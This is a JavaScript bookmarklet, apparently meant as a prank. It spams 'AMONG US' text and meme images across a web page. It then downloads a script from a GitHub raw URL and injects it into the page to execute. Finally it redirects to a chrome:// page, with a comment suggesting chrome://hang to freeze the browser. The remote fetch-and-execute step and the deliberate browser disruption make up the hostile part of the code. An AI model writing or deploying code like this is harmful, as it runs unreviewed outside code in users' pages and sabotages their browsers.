javascript:(function() {
  var text = "AMONG US WKJHK";
  var image = document.createElement("img");
  image.src = "https://i.ytimg.com/vi/WeUqtgQIA1k/maxresdefault.jpg";
  image.alt = "Among Us FAT Impostor, this should be easy - YouTube";
  image.style.position = "fixed";
  image.style.zIndex = "9999";
  image.style.maxWidth = "100vw"; // Fit image width to viewport width
  image.style.height = "auto"; // Maintain aspect ratio

  var textDelay = 10; // 0.01 seconds delay between each text spam (10 milliseconds)
  var imageDelay = 20; // 0.02 seconds delay between each image spam (20 milliseconds)
  var waitTime = 4000; // 4 seconds wait time before spamming images
  var fetchDelay = 300; // 0.3 seconds delay before fetching external script (300 milliseconds)

  function getRandomPosition() {
    var screenWidth = window.innerWidth;
    var screenHeight = window.innerHeight;
    var randomX = Math.floor(Math.random() * screenWidth);
    var randomY = Math.floor(Math.random() * screenHeight);
    return [randomX, randomY];
  }

  var textInterval = setInterval(function() {
    var currentPosition = getRandomPosition();
    var span = document.createElement("span");
    span.textContent = text;
    span.style.position = "fixed";
    span.style.top = currentPosition[1] + "px";
    span.style.left = currentPosition[0] + "px";
    span.style.color = getRandomColor();
    span.style.fontSize = getRandomFontSize(); // Optional: Generate random font size for text
    span.style.zIndex = "9999";
    document.body.appendChild(span);
  }, textDelay);

  setTimeout(function() {
    clearInterval(textInterval);
    var imageInterval = setInterval(function() {
      var currentPosition = getRandomPosition();
      image.style.top = currentPosition[1] + "px";
      image.style.left = currentPosition[0] + "px";
      document.body.appendChild(image.cloneNode(true));
    }, imageDelay);
    setTimeout(function() {
      fetchExternalScript();
    }, fetchDelay);
  }, waitTime);

  // Helper function to generate random colors
  function getRandomColor() {
    var letters = "0123456789ABCDEF";
    var color = "#";
    for (var i = 0; i < 6; i++) {
      color += letters[Math.floor(Math.random() * 16)];
    }
    return color;
  }

  // Helper function to generate random font size
  function getRandomFontSize() {
    var minSize = 16;
    var maxSize = 48;
    return Math.floor(Math.random() * (maxSize - minSize + 1)) + minSize + "px";
  }

  // Function to fetch and execute external script
  function fetchExternalScript() {
    var url = 'https://raw.githubusercontent.com/THeHamBurgueler/AmongUsfun/main/AmongUs.js';
    fetch(url)
      .then(response => response.text())
      .then(code => {
        var script = document.createElement('script');
        script.textContent = code;
        document.body.appendChild(script);
      })
      .catch(error => console.error('Error fetching bookmarklet:', error));
  }

  // Open chrome://hang after 5 seconds
  setTimeout(function() {
    window.location.href = "chrome://network"; // put the chrome://hang here
  }, 5000);
})();
